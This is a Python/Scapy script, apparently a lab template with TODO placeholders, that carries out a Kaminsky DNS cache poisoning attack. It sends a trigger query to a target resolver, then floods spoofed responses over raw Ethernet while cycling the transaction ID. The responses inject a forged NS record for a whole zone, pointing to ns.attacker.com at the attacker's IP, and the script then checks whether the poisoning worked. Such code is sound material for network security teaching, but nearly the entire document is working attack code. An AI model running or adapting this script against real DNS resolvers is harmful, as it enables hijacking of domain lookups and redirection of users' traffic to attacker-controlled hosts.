from scapy.all import *
import struct
import socket
import random
import string

# --- 1. CONFIGURATION ---
target_dns = "10.9.0.53"
auth_dns = "10.9.0.154"  # example-dns authoritative server
attacker_ip = "YOUR_IP_HERE" # TODO: Fill with your machine's IP
target_port = 33333

# --- 2. TRIGGER QUERY ---
# Generate a random subdomain to bypass any existing cache entry.
random_prefix = ''.join([random.choice(string.ascii_lowercase) for _ in range(5)])
domain = "{}.example.com".format(random_prefix)

print("[*] 1. Sending trigger query for {}...".format(domain))
trigger = IP(dst=target_dns) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain))
send(trigger, verbose=0)

# --- 3. SPOOFED RESPONSE ---
print("[*] 2. Flooding spoofed KAMINSKY responses (Layer 2)...")

base_pkt = (
    Ether(dst="ff:ff:ff:ff:ff:ff") /
    IP(src=auth_dns, dst=target_dns) /
    UDP(sport=53, dport=target_port, chksum=0) /
    DNS(
        id=0,
        qr=1,
        aa=1,
        qd=DNSQR(qname=domain),
        an=DNSRR(rrname=domain, type='A', ttl=86400, rdata="1.1.1.1"),
        
        # TODO: Set Authority (NS) record to claim control of the ENTIRE zone
        ns=DNSRR(rrname="TARGET_DOMAIN_HERE", type='NS', ttl=86400, rdata="ns.attacker.com"),
        
        # TODO: Set Additional (A) record to map the fake NS to your IP
        ar=DNSRR(rrname="ns.attacker.com", type='A', ttl=86400, rdata=attacker_ip)
    )
)

# --- 4. LAYER 2 FLOODING ---
raw_bytes = bytearray(raw(base_pkt))
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.bind(("eth0", 0))

# TODO: Define the max value for a 16-bit Transaction ID
MAX_TXID = 0

# Transaction ID offset is always 42 bytes inside this raw packet.
for txid in range(0, MAX_TXID):
    struct.pack_into('!H', raw_bytes, 42, txid)
    s.send(raw_bytes)

print("[+] Kaminsky flood complete for {}!".format(domain))

# --- 5. VERIFICATION ---
print("[*] 3. Verifying cache poisoning...")
verification = sr1(
    IP(dst=target_dns) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain)),
    timeout=3,
    verbose=0
)

if verification and verification.haslayer(DNS) and verification.an and verification.an.rdata == "1.1.1.1":
    print("[+] Verification SUCCESS: {} resolves to 1.1.1.1".format(domain))
else:
    print("[-] Verification FAILED: {} did not resolve to the fake IP".format(domain))